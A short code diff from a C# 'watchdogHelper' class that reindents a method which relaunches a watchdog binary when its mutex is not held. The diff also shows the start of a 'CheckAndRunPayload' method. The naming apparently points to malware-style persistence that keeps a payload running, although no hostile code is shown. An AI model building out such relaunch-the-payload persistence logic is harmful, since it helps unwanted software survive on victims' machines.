@@ -225,10 +225,10 @@ public class watchdogHelper
     public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
         {
             if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
-        {
-                runBinary(Path.Combine(watchdogPath, watchdogName));
+            {
+                    runBinary(Path.Combine(watchdogPath, watchdogName));
+                }
             }
-        }
 
         public static void CheckAndRunPayload(string payloadPath, string payloadName)
         {
